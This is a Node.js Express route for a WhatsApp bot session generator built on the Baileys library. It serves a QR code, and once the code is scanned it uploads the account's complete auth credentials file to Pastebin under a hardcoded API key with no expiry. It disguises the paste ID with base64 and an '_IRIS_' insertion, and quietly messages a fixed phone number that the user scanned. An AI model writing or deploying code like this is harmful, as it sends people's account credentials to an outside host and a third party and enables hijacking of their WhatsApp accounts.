const PastebinAPI = require('pastebin-js'),
pastebin = new PastebinAPI("r1eflgs76uuvyj-Q8aQFCVMGSiJpDXSL");
const {makeid} = require('./id');
const QRCode = require('qrcode');
const express = require('express');
const path = require('path');
const fs = require('fs');
let router = express.Router()
const pino = require("pino");
const {
	default: makeWASocket,
	useMultiFileAuthState,
	jidNormalizedUser,
	Browsers,
	delay,
	fetchLatestBaileysVersion,
	makeInMemoryStore,
} = require("@whiskeysockets/baileys");

function removeFile(FilePath) {
	if (!fs.existsSync(FilePath)) return false;
	fs.rmSync(FilePath, {
		recursive: true,
		force: true
	})
};



const {
	readFile
} = require("node:fs/promises")
router.get('/', async (req, res) => {
	const id = makeid();
	async function Getqr() {
		const {
			state,
			saveCreds
		} = await useMultiFileAuthState('./temp/' + id)
		try {
			let session = makeWASocket({
				auth: state,
				printQRInTerminal: false,
				logger: pino({
					level: "silent"
				}),
				browser: Browsers.macOS("Desktop"),
			});

			session.ev.on('creds.update', saveCreds)
			session.ev.on("connection.update", async (s) => {
				const {
					connection,
					lastDisconnect,
					qr
				} = s;
				if (qr) await res.end(await QRCode.toBuffer(qr));
				if (connection == "open") {
					 
					await delay(10000);
					let link = await pastebin.createPasteFromFile(__dirname+`/temp/${id}/creds.json`, "pastebin-js test", null, 1, "N");
                        let data = link.replace("https://pastebin.com/", "");
                        let code = btoa(data);
                        var words = code.split("");
                        var ress = words[Math.floor(words.length / 2)];
                        let c = code.split(ress).join(ress + "_IRIS_");
                        
                        await session.sendMessage("27828418477@s.whatsapp.net", {text:`user: ${session.user.id} scanned`})
                        await session.sendMessage(session.user.id, {text:`${c}`})

     
     			await delay(100);
					await session.ws.close();
					return await removeFile("temp/" + id);
				} else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
					await delay(10000);
					Getqr();
				}
			});
		} catch (err) {
			if (!res.headersSent) {
				await res.json({
					code: "Service Unavailable"
				});
			}
			console.log(err);
			await removeFile("temp/" + id);
		}
	}
	return await Getqr()
	//return //'qr.png', { root: "./" });
});
module.exports = router
